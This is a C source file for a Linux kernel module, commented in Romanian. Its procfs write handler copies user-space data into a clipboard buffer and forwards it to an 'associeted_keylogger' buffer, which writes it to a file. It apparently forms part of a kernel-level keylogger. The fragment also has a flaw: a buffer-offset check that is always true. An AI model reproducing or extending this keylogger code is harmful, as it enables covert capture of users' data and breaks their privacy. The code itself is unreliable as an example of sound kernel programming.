#include "clipboard_callback.h"
#include "struct_clipboard.h"
#include "flush_clipboard.h"
#include "write_to_file.h"

ssize_t clipboard_write_procfs(struct file *file, const char __user *user_buffer,size_t count,loff_t *pos)
{

    struct CLIPBOARD *clipboard;
    clipboard=container_of(file->private_data, CLIPBOARD, clipboard_entry);
    
    size_t bytes_to_copy; 
    size_t bytes_remaining = count; 
    while(bytes_remaining> 0)
    {
        // Determină câți byteți pot fi copiați în buffer-ul curent
        bytes_to_copy = min(bytes_remaining, CLIPBOARD_BUFFER_SIZE - clipboard->clipboard_read_buffer_offset);
         // Copiază datele în buffer-ul de citire
        if (copy_from_user(clipboard->clipboard_read_buffer + clipboard->clipboard_read_buffer_offset,
                           user_buffer, bytes_to_copy)) {
            pr_err("Eroare la copierea datelor din spațiul utilizator\n");
            return -EFAULT; // Eroare de copiere
        }

        clipboard->clipboard_read_buffer_offset += bytes_to_copy;
        bytes_remaining -= bytes_to_copy;
        user_buffer += bytes_to_copy;
        if (clipboard->clipboard_read_buffer_offset <= CLIPBOARD_BUFFER_SIZE) {
            memcpy(clipboard->associeted_keylogger->write_buffer,clipboard->clipboard_read_buffer,clipboard->clipboard_read_buffer_offset);
            write_to_file(&clipboard->associeted_keylogger->work_struct);
            flush_clipboard(clipboard);
        }
    }
    
    return count;
}